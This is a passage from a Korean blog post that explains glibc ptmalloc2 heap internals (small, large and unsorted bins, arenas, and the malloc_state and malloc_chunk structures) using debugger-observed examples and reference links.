<p>사이즈가 128byte인 메모리 3개와 200byte 1개와 160byte 2개, 그리고 해당 메모리 사이에 16byte 메모리 할당을 요청한다.</p>
<ul>
<li>“small*”변수들이 가리키는 메모리들 사이에 16byte의 메모리 할당을 요청하지 않으면 Small bin에 해당하는 chunk들이 연속으로 배치되기 때문에 서로 병합된다.</li>
<li>“small*”변수들이 가리키는 메모리들을 모두 해제한 후 200byte, 128byte의 메모리 할당을 요청한다.</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/btK37x/btqFhlZLYK5/wZcwR1N2jH9481u8srVWL1/img.png" alt="26"></p>
<ul>
<li>free chunk들은 먼저 Unsorted bin에 배치되기 때문에 마지막에 해제된 chunk는 Unsorted bin에서 찾을 수 있다.<ul>
<li>해당 어플리케이션에서 마지막에 해제된 chunk는 0x602300이며, 크기는 176byte이다.</li>
<li>free()를 이용하여 해제할 메모리는 0x6023c0이며, 이 메모리는 마지막에 해제된 chunk과 인접해 있다.</li>
</ul>
</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/bGZW6h/btqFjdfn7zH/2VkQTQ0KnjJ4AKHcnkykok/img.png" alt="27"></p>
<ul>
<li>free()가 실행되면 두 chunk는 병합되어 하나의 chunk가 된다.<ul>
<li>해당 chunk(0x602300)의 크기가 352byte가 되었다.</li>
</ul>
</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/bnr7IZ/btqFjFWOLAJ/CDOl4QlxW43IHj4zvIsqW1/img.png" alt="28"></p>
<ul>
<li>크기가 144 (128 + 16) 바이트 인 청크의 인덱스는 16과 17이다.</li>
<li>Unsorted bin에 있던 chunk가 재할당되면 list의 연결이 끊기기 때문에, Allocator는 연결이 끊긴 chunk들을 bins에 배치한다.<ul>
<li>크기가 128byte인 free chunk가 3개 있다.</li>
<li>이 중에서 bins<a href="fd">16</a>에는 마지막에 해제된 chunk가, bins<a href="bk">17</a>에는 먼저 해제된 chunk가 배치된다.</li>
</ul>
</li>
<li>할당자는 해당 chunk 앞,뒤에 있는 chunk의 mchunkptr를 fd와 bk에 배치한다.<ul>
<li>첫번째에 있는 chunk와 끝에 있는 chunk는 fd, bk에 “bins”의 주소를 배치한다.</li>
<li>할당자는 free chunk에 배치된 “bins”의 주소를 하나의 chunk로 본다.</li>
<li>그래서 할당자는 bins[idx]의 주소에서 16을 뺀 주소를 사용한다.</li>
<li>이것은 doubly-linked list 형태이다.</li>
</ul>
</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/chdXE9/btqFhLjCvvc/QXgz6thKdgNxZVXE8zfZo0/img.png" alt="29"></p>
<p>어플리케이션이 Small bin에 배치된 chunk와 동일한 크기의 메모리 할당을 요청하면, 할당자는 먼저 해제되었던 chunk(0x6020c0)를 재할당한다.</p>
<ul>
<li>그리고 해당 chunk(0x6020c0) 뒤에 있던 chunk(0x602000)가 bins[17]에 배치된다.</li>
</ul>
<p><strong>example2</strong></p>
<p><img src="https://blog.kakaocdn.net/dn/brJQKB/btqFiAIXUZH/Gt37rSbONdx1NZeI8579m1/img.png" alt="30"></p>
<ul>
<li>크기가 272byte인 chunk의 인덱스는 (272/16 -1) * 2 = 32(fd), 33(bk)이다. </li>
<li>bins[32],bins[33]은 bins17으로 하나의 주소를 사용한다.  (bins[30],bins[31] = bins16으로 하나의 주소 사용)</li>
<li>맨처음에 해제된 chunk의 mchunkptr는 bins[33]에 배치된다.</li>
<li>맨마지막에 해제된 chunk의 mchunkptr는 bins[32]에 배치된다.</li>
</ul>
<h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><ul>
<li>Large bin이 포함하는 chunk의 크기가 MIN_LARGE_SIZE와 같거나 큰 chunk들이다.<ul>
<li>64bit 아키텍처의 경우 free chunk의 크기가 1024와 같거나 크면 해당 chunk는 Larger bin에 배치된다.</li>
</ul>
</li>
<li>Large bin이 포함하는 chunk들은 서로 인접해 있을 경우 하나의 chunk로 병합된다.</li>
<li>Large bin은 63개의 bin을 사용하며, small bin과 같이 doubly-linked list로 구성된다.<ul>
<li>그러나 Large bin은 Small Bin과 다르게 하나의 bin에 다양한 크기의 chunk들을 보관한다.</li>
<li>해당 bin들은 bin내에서 크기 별로 정렬되어 할당의 효율성을 높인다.</li>
</ul>
</li>
</ul>
<p>(32bit)</p>
<ul>
<li><p>32개의 bin은 각 64바이트 크기를 가지는 청크의 binlist를 가진다.</p>
<ul>
<li>ie) 첫 번째 large bin(Bin 65)은 512바이트 ~ 568바이트 크기의 청크 binlist를 가지고,</li>
<li>두 번째 large bin(Bin 66)은 576바이트 ~ 632바이트 크기의 청크 binlist를 가지는 식으로, 이어진다.</li>
</ul>
</li>
<li><p>16개의 bin은 각 512바이트 크기를 가지는 청크의 binlist를 가진다.</p>
</li>
<li><p>8개의 bin은 각 4,096바이트 크기를 가지는 청크의 binlist를 가진다.</p>
</li>
<li><p>4개의 bin은 각 32,768바이트 크기를 가지는 청크의 binlist를 가진다.</p>
</li>
<li><p>2개의 bin은 각 262,144바이트 크기를 가지는 청크의 binlist를 가진다.</p>
</li>
<li><p>1개의 bin은 남은 크기를 가지는 청크를 가진다.</p>
</li>
<li><p>small bin과 달리, large bin 내부의 청크는 동일한 크기를 가지고 있지 않다. 따라서, 내림차순으로 저장된다.</p>
<ul>
<li>가장 큰 청크는 binlist의 가장 앞쪽에 저장되고, 가장 작은 청크는 binlist의 가장 뒷쪽에 저장된다.</li>
<li>fd로 갈 수록 크기가 작고, bk로 갈 수록 크기가 크다.</li>
</ul>
</li>
<li><p>fd_nextsize(나보다 작은 크기)와 bk_nextsize(나보다 큰 크기)를 사용하여 크기 순으로 정렬, 동일한 크기의 chunk 끼리는 연결되지 않는다. </p>
</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/cUEc85/btqFhLxbVnC/uH1J1YDy5Upqf6YI2SXWFk/img.png" alt="31"><br><img src="https://blog.kakaocdn.net/dn/CSE3x/btqFhK6aLHL/eAltZ7LMuR0wVnMavYMbT1/img.png" alt="32"></p>
<p>Large bin에 해당하는 chunk들의 인덱스는 largebin_index_32(), largebin_index_64() 함수를 이용하여 확인할 수 있다.</p>
<ul>
<li>free chunk의 크기를 쉬프트 연산을 이용하여 나누고, 그 값이 조건에 만족하는 값이라면 기본 인덱스 값을 더한 값이 해당 chunk의 인덱스 값이 된다.</li>
<li>ex)64bit 아키텍처에서 chunk의 크기가 3072 ~ 3120인 chunk들은 bin[96]에 보관된다. 48 + (3072 &gt;&gt; 6) = 96</li>
</ul>
<p><strong>example</strong></p>
<p><img src="https://blog.kakaocdn.net/dn/c2OJGW/btqFknn903G/RGEggi2wqPM9veObJXAveK/img.png" alt="33"></p>
<p>1024, 1040, 1056 byte인 메모리 3개, 200byte 1개, 1120byte 2개, 그리고 해당 메모리 사이에 16byte 메모리 할당을 요청한다.</p>
<ul>
<li>“large*” 변수가 가리키는 메모리들 사이에 16byte의 메모리 할당을 요청하지 않으면 Large bin에 해당하는 chunk들이 연속으로 배치되기 때문에 서로 병합된다.</li>
<li>“large*” 변수가 가리키는 메모리들을 모두 해제한 후 200byte, 1040byte의 메모리 할당을 요청한다.</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/E3OQ5/btqFhMv8yTv/w6wYv3RKvESRQGwFVrWEGk/img.png" alt="34"></p>
<ul>
<li>마지막으로 해제된 chunk는 0x602db0이며, 크기는 1136byte이다.<ul>
<li>free()를 이용하여 해제할 메모리는 0x603230이며, 이 메모리는 마지막에 해제된 chunk과 인접해 있다.</li>
</ul>
</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/tCTOL/btqFiOAeHPF/ECdWw4C4lVD0kIqPwVCRMk/img.png" alt="35"></p>
<ul>
<li>free()가 실행되면 두 chunk는 병합되어 하나의 chunk가 된다<ul>
<li>해당 chunk(0x602db0)의 크기가 2272byte가 되었다.</li>
</ul>
</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/cc2ObH/btqFjFbv2sp/GPguvCaoRvlKxNQ2kntYD0/img.png" alt="36"></p>
<p>크기가 1040(1024 + 16)byte 인 chunk의 인덱스는 126 및 127이다.</p>
<ul>
<li>Large bin은 Small bin과 동일하게 doubly-linked list 로 chunk들을 연결한다.</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/mevsd/btqFiy5vG7r/xOIVDMEukkT7MP6yCYKdc0/img.png" alt="37"></p>
<p>할당자는 Large bin에 해당하는 chunk가 “bins”에 배치될때 해당 인덱스에 해당하는 chunk들을 크기 별로 정렬한다.</p>
<ul>
<li>Chunk가 Unsorted bin에 있을 때는 해제된 순서대로 연결되어 있다.<ul>
<li>0x602870 (size : 0x430) &lt;–&gt; 0x602000 (size : 0x410) &lt;–&gt; 0x602430 (size : 0x420)</li>
</ul>
</li>
<li>하지만 Chunk가 “bins”에 배치되면 chunk의 크기순으로 정렬된다.<ul>
<li>0x602870 (size : 0x430) &lt;–&gt; 0x602430 (size : 0x420) &lt;–&gt; 0x602000 (size : 0x410)</li>
</ul>
</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/baowZv/btqFiAPQIvH/KCwqL2rOYfMYyygZqLbke0/img.png" alt="38"></p>
<p>Large bin에 배치된 chunk와 동일한 크기의 메모리 할당을 요청하면, 할당자는 요청한 크기와 동일한 chunk(0x602440)를 재할당한다.</p>
<h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><ul>
<li>청크를 분할한 후에 남은 chunk와 반환된 모든 청크는 Unsorted bin에 먼저 배치된다.<ul>
<li>해당 bin은 Chunk 크기에 대한 제한이 없기 때문에 다양한 크기의 청크가 해당 Bin에 저장될 수 있다. </li>
<li>그러나 Fast bin에 해당하는 chunk는 Unsorted bin에 배치 되지 않는다.</li>
<li>할당자는 Unsorted bin에 요청받은 메모리의 크기와 같은 chunk가 있다면 해당 chunk를 재할당한다.</li>
</ul>
</li>
<li>Unsorted Bin은 1개의 bin만 사용하며, doubly-linked list와 FIFO를 사용한다.<ul>
<li>해당 bin을 이용해 적절한 bin을 찾는 시간이 덜 걸리므로 할당과 해제의 처리가 빠르다.</li>
</ul>
</li>
<li>Allocator에 의해 검색된 Chunk는 바로 재할당 되거나 아니면 원래의 Bin에 배치된다.<ul>
<li>unsorted bin의 모든 chunk는 재할당을 위한 1번의 기회가 주어진다. </li>
<li>재할당에 실패한 경우, 크기에 따라 small bin이나 large bin에 재배치된다.</li>
</ul>
</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/uVAnF/btqFkI6IZp7/oebaRO9mgzu9oaiv4E4jAk/img.png" alt="39"></p>
<h3 id="fastbinsY-amp-bins"><a href="#fastbinsY-amp-bins" class="headerlink" title="fastbinsY &amp; bins"></a>fastbinsY &amp; bins</h3><p><img src="https://blog.kakaocdn.net/dn/bcQlgE/btqFhMwaVTB/2in6j4lpemr5md3bwqXk9K/img.png" alt="40"><br><img src="https://blog.kakaocdn.net/dn/zNDin/btqFhK6dOm8/FvFKxNxqVLlXiNKRqxKV31/img.png" alt="41"></p>
<h2 id="Arena"><a href="#Arena" class="headerlink" title="Arena"></a>Arena</h2><ul>
<li>ptmalloc2는 각 스레드가 서로 간섭하지 않고, 서로 다른 메모리 영역에 액세스 할 수 있게 한다.<ul>
<li>이러한 메모리 영역을 “Arena”라고한다.</li>
<li>Main을 포함한 모든 각 Threads에 대한 힙 영역이라고 할 수 있다.</li>
<li>모든 Threads가 각자의 Arena를 가지진 못 하고 32bit와 64bit System과 시스템의 Core 갯수에 따라 Arena의 갯수에 제한이 있다.</li>
<li>제한을 넘어 Arena가 필요한 경우는 기존에 사용하던 Arena를 재사용한다.</li>
</ul>
</li>
<li>응용 프로그램에는 “main arena”이라는 arena가 있다.<ul>
<li>malloc()에는 이 arena를 가리키는 정적 변수가 있으며 각 arena에는 추가 arena를 연결하는 다음 포인터가 있다.</li>
</ul>
</li>
<li>각 Arena는 하나 이상의 힙 메모리를 얻는다.<ul>
<li>main arena는 프로그램의 초기 힙을 사용한다 (.bss 등 직후 시작)</li>
<li>main arena는 힙 공간이 부족하면 확장하여 사용하기 때문에 추가로 힙을 할당 할 필요가 없다. </li>
<li>추가 Arena는 mmap를 통해 힙에 메모리를 할당하고, 이전 힙이 소모되면 더 많은 힙을 힙목록에 추가한다.</li>
</ul>
</li>
<li>Arena는 heap 메모리에서 할당된 chunk들을 관리한다.<ul>
<li>Arena에서 관리되는 chunk들은 응용 프로그램에서 사용 중이거나 사용이 가능한 chunk들 이다.</li>
<li>사용중인 청크는 Arena에서 추적되지 않는다.</li>
<li>Free chunk는 크기와 히스토리에 따라 분류되어 arena에 저장된다.</li>
<li>할당자는 arena에서 할당 요청을 충족하는 chunk를 신속하게 찾을 수 있다.</li>
</ul>
</li>
<li>Arena의 개수는 현재 시스템의 core의 수에 기반된다.<ul>
<li>For 32 bit systems: Number of arena = 2 * number of cores.</li>
<li>For 64 bit systems: Number of arena = 8 * number of cores.</li>
</ul>
</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/dcqJcI/btqFkmwV7Is/49edJHR7GX4xYlIfl2ny30/img.png" alt="42"></p>
<p>malloc.c 코드내에 “main_arena”라는 변수가 존재한다.</p>
<ul>
<li>이 변수가 앞에서 언급한 main arena이다. </li>
<li>해당 변수는 “struct malloc_state” 구조체를 사용한다.</li>
</ul>
<h2 id="구조체-정리"><a href="#구조체-정리" class="headerlink" title="구조체 정리"></a>구조체 정리</h2><h3 id="struct-malloc-info-Heap-Header"><a href="#struct-malloc-info-Heap-Header" class="headerlink" title="struct malloc_info (Heap_Header)"></a>struct malloc_info (Heap_Header)</h3><p><img src="https://blog.kakaocdn.net/dn/d1PLuz/btqFkTOrxdy/jhgbamKIK9bLWaQeQ6bKmK/img.png" alt="43"></p>
<ul>
<li>Arena는 각 Threads에 대한 힙 영역이기 때문에 힙 영역의 공간이 부족하면 새로운 영역에 추가로 할당받아 여러 개의 힙 영역을 가질 수 있다(Main Thread 제외).</li>
<li>이런 힙 영역은 어떤 Arena가 관리하고 있는지, 힙 영역의 크기가 어느정도인지, 이전에 사용하던 heap 영역의 정보가 어디에 있는지를 저장할 필요가 있다.</li>
<li>이런 정보를 저장하기 위한 구조체가 malloc_info 구조체이며, 힙에 대한 정보를 저장하기 때문에 Heap_Header라고도 할 수 있다(Main Thread는 확장을 해서 쓰기 때문에 제외)</li>
</ul>
<h3 id="struct-malloc-state-Arena-Header"><a href="#struct-malloc-state-Arena-Header" class="headerlink" title="struct malloc_state (Arena Header)"></a>struct malloc_state (Arena Header)</h3><p><img src="https://blog.kakaocdn.net/dn/bu8Mpb/btqFknWMET1/0Qa8di0M5Hv1cAvxn4JCtK/img.png" alt="44"></p>
<ul>
<li>위의 Heap_Header에서는 단순히 힙 영역에 대한 정보만을 저장하였기 때문에, 힙 영역에서도 어떤 부분을 사용하면 되는지에 대해 Arena는 이를 관리하기 때문에 알고 있을 필요가 있다.</li>
<li>malloc_state 구조체는 각 Arena에 하나씩 주어지고, 해제된 Chunk를 관리하는 연결리스트 bin과 최상위 Chunk인 top chunk와 같은 Arena에 대한 정보를 저장한다.</li>
<li>단일 스레드 arena는 여러 개의 힙을 가질 수 있지만, 이러한 모든 힙에 대해서는 오직 하나의 arena header만이 존재한다.</li>
<li>“malloc_state”의 구조는 다음과 같다.</li>
<li>mutex는 해당 arena에 대한 액세스를 제어하는 데 사용된다.<ul>
<li>mutex를 이용하여 여러 스레드간에 arena 사용 충돌이 발생하것을 방지한다.</li>
<li>패스트 빈에 대한 액세스와 같은 일부 작업은 arena를 잠글 필요가 없다.</li>
<li>이 외에 다른 모든 작업을 하려면 스레드가 arena를 잠글 필요가 있다.</li>
</ul>
</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/buIpXb/btqFmuUOOJe/tbPsbUnOajN6gTH86fu6c1/img.png" alt="45"></p>
<p>main_arena의 flags는 2개의 bit로 정보들의 유무를 나타낸다.</p>
<ul>
<li>첫번째bit는 해당 Arena가 fastbin(fastchunk)를 가지고 있는지 나타낸다.<ul>
<li>fastbin(fastchunk)이 arena에 있다면 첫번째 bit의 값은 0이, 없다면 1이 보관 된다.</li>
</ul>
</li>
<li>두번째bit는 해당 Arena가 인접한지를 나타낸다.<ul>
<li>해당 arena가 인접한 arena라면 1이, 아니라면 0이 표시된다.</li>
<li>Non-main arena는 하위 힙으로 구성되며 항상 NONCONTIGUOUS_BIT가 설정된다.</li>
</ul>
</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/JKQMg/btqFk76SEEw/i1fTEMbt85aI8ch6KKyoJ1/img.png" alt="46"></p>
<p>fastbins에 fastbin에 해당하는 free chunk가 배치된다.</p>
<ul>
<li>fastbin에 해당하는 chunk의 인덱스는 fastbin_index()함수를 이용하여 확인할 수 있다.</li>
<li>해당 함수는 우측 시프트를 이용하여 chunk의 크기(sz)를 8(32bit) 또는 16(64bit)으로 나눈 값에 2를 뺀다.</li>
<li>ex)64bit 아키텍처에서 크기가 32byte인 chunk의 인덱스는 0((32 &gt;&gt; 4) - 2)이다.</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/ljz1L/btqFjqNnUv6/4vAXUaah7F1dew2KwTdRC1/img.png" alt="47"></p>
<p>top에는 Top chunk가 배치된다.</p>
<ul>
<li>Top chunk는 Arena의 가장 상위 영역에 있는 Chunk이며, bin에 포함되지 않는다.</li>
<li>Top chunk는 PREV_INUSE 플래그가 설정된다.</li>
<li>Top chunk는 요청한 힙을 할당할 수 있는 충분한 청크가 bin에 없는 경우에 사용된다.</li>
<li>Top chunk의 크기가 사용자가 요청한 크기보다 큰 경우 top chunk는 2개로 분리된다.<ul>
<li>(사용자가 요청한 크기의 청크와 분할되고 남은 크기의 나머지 청크(Remainder chunk))</li>
</ul>
</li>
<li>Remainder chunk는 새로운 Top chunk가 된다.</li>
<li>할당자는 Top chunk의 크기가 사용자가 요청한 크기보다 작은 경우 조건에 따라 Top chunk의 크기를 증가시키거나, 새로운 Heap영역을 할당한다.<ul>
<li>할당자는 요청받은 chunk의 크기가 DEFAULT_MMAP_THRESHOLD(131072)보다 큰경우 mmap()을 호출하여 새로운 Heap 영역을 매핑한다.</li>
</ul>
</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/pqv0s/btqFknCCVTE/754R5SKZwD1yKafQukbbBK/img.png" alt="48"></p>
<p>할당자는 메모리를 할당하기에 arena의 공간이 부족할 경우 sbrk()를 호출하여 메모리의 공간을 증가시킨다.</p>
<ul>
<li>malloc.c에서는 MORECORE라는 매크로를 이용하여 sbrk() 함수를 호출한다.</li>
</ul>
<p>last_remainder에는 chunk를 할당 한 후에 남은 chunk가 배치된다.</p>
<ul>
<li>할당자는 요청한 크기와 일치하는 free chunk가 없으면, 요청한 크기보다 큰 free chunk를 요청 크기로 분할하는 경우가 있다.</li>
</ul>
<p>“bins”에 Unsorted bin, Small bin, Large bin가 포함하는 free chunk가 배치된다.</p>
<ul>
<li>이 변수는 배열 변수이며 총(128 * 2 - 2)254개의 chunk 포인터를 배치할 수 있다.</li>
<li>free chunk를 bins에 배치할 때 chunk의 fd, bk 정보를 저장하기 때문 배열의 크기가 128이 아닌 254이다.<ul>
<li>bins[0], bins[1]은 Unsorted bin들이 배치된다.</li>
</ul>
</li>
</ul>
<p>binmap은 bins를 4(BINMAPSIZE)개의 영역으로 나누어서 정보를 배치한다.</p>
<ul>
<li>binmap[0] : 0 ~ 31, binmap[1] : 32 ~ 64, binmap[2] : 65 ~ 96, binmap[3] : 97 ~128<ul>
<li>bins[]에 free chunk가 배치되면, binmap[]에는 그 bin이 해당하는 위치에 해당 bin의 bit가 배치된다.</li>
</ul>
</li>
<li>예를 들어 크기가 256byte인 free chunk의 인덱스는 65이며, binmap[2]에 bit정보가 저장된다.<ul>
<li>할당자는 idx2bit() 함수를 이용하여 저장할 bit값을 계산한다.</li>
<li>binmap[2]에는 2(1 &lt;&lt; (index(65) &amp; 31))가 배치된다.</li>
</ul>
</li>
<li>binmap[] 배열을 사용하면 많은양의 빈 검색이 간소화된다. </li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/pBIcq/btqFjp8GJ7q/gxaKHLkhjhohQOWN4cxsX1/img.png" alt="49"></p>
<p>next는 여러 arena가 있는 경우에 추가 arena을 연결하는 포인터다.</p>
<h3 id="struct-malloc-chunk-Chunk-Header"><a href="#struct-malloc-chunk-Chunk-Header" class="headerlink" title="struct malloc_chunk (Chunk Header)"></a>struct malloc_chunk (Chunk Header)</h3><p><img src="https://blog.kakaocdn.net/dn/wz1op/btqFnjetERJ/Z5fcLnkXBf0q8xmZIY5r51/img.png" alt="50"></p>
<ul>
<li>힙 영역은 사용자에 의해 할당되거나, 해제되거나 하면 Chunk라는 단위로 관리된다.</li>
<li>malloc_chunk는 현재 chunk의 크기와 바로 인접한 이전 chunk의 크기를 저장하고, 해제된 chunk는 bin에 의해 연결리스트로 관리되기 때문에 이중 연결리스트를 위한 포인터 주소를 저장한다.</li>
<li>마지막으로 있는 2개의 chunk 포인터는 large bin을 위해서만 사용된다. large bin은 다른 bin과 다르게 연결리스트에 크기를 대략적으로 관리하기 때문에 연결리스트 내부에서 크기 순으로 추가적인 연결리스트를 가진다.</li>
</ul>
<p>※ </p>
<ul>
<li>Main arena는 여러 개의 힙과 heap_info 구조체를 가질 수 없다. main arena의 공간이 부족한 경우, sbrk 힙 영역은 메모리가 매핑된 영역까지 확장(인접한 영역)된다.</li>
<li>thread arena와 달리, main arena의 arena header는 sbrk 힙 영역의 일부가 아니다. main arena는 전역 변수이며, libc.so의 데이터 영역에서 찾을 수 있다.</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/r2QXU/btqFlje0b56/Kgf2kinlQzkDsx1ARZ4oCk/img.png" alt="51"><br><img src="https://blog.kakaocdn.net/dn/1YJRM/btqFk7skjCc/WRXlVZCiMhjtggIgzbNri1/img.png" alt="52"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li><a href="https://www.lazenca.net/pages/viewpage.action?pageId=1147929">https://www.lazenca.net/pages/viewpage.action?pageId=1147929</a></li>
<li><a href="https://tribal1012.tistory.com/141">https://tribal1012.tistory.com/141</a></li>
<li><a href="https://tribal1012.tistory.com/78">https://tribal1012.tistory.com/78</a></li>
<li><a href="https://dreamhack.io/">https://dreamhack.io/</a></li>
<li><a href="http://studyfoss.egloos.com/5206220">http://studyfoss.egloos.com/5206220</a></li>
</ul>
]]></content>
      <categories>
        <category>Research</category>
      </categories>
      <tags>
        <tag>malloc</tag>
        <tag>heap</tag>
      </tags>
  </entry>
</search>
